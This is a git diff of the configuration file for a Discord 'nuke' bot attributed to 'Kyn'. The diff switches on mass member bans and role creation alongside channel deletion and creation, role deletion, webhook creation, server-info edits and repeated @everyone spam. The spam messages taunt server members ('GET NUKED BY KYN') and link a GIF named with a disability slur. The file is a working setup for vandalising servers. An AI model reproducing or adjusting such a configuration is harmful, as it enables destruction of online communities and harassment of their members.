@@ -2,7 +2,7 @@ require('dotenv').config(); // Load env vars (for local use)
 
 module.exports = {
     general: {
-        commandPrefix: '&',
+        commandPrefix: '!',
         uptimePort: 3000,
         selfPingInterval: 300000,
         reconnectInterval: 60000,
@@ -19,13 +19,13 @@ module.exports = {
             'Nuked-By-Kyn-☠️💣',
             'Kyn-Own-This-Server-😹💤'
         ],
-        channelCount: 20,
+        channelCount: 10,
         spammedMessages: [
             '# @everyone GET NUKED BY KYN! 🐵 https://discord.gg/GxgqvZ5aE3',
             '# @here KYN OWNS YOU ALL NEWGENS! https://tenor.com/view/meme-down-syndrome-funny-tongue-action-tongue-out-meme-gif-572114404054760484',
             '# @everyone LOL THIS SERVER GOT DESTROYED 😹 https://cdn.discordapp.com/attachments/907080818562854954/1217174300650508448/attachment.gif?ex=68049127&is=68033fa7&hm=aaeea557f62d47bba1de31e232b160ffbdc1a9184ef8d251752959c683744782&'
         ],
-        spamRounds: 200,
+        spamRounds: 100,
         timing: {
             channelCreateDelay: 10,
             channelDeleteDelay: 10,
@@ -41,11 +41,11 @@ module.exports = {
         behavior: {
             createChannels: true,
             deleteChannels: true,
-            banMembers: false,
+            banMembers: true,
             spamMessages: true,
             createWebhooks: true,
             editServerInfo: true,
-            createRoles: false,
+            createRoles: true,
             deleteRoles: true,
             leaveServerAfterNuke: true 
         },
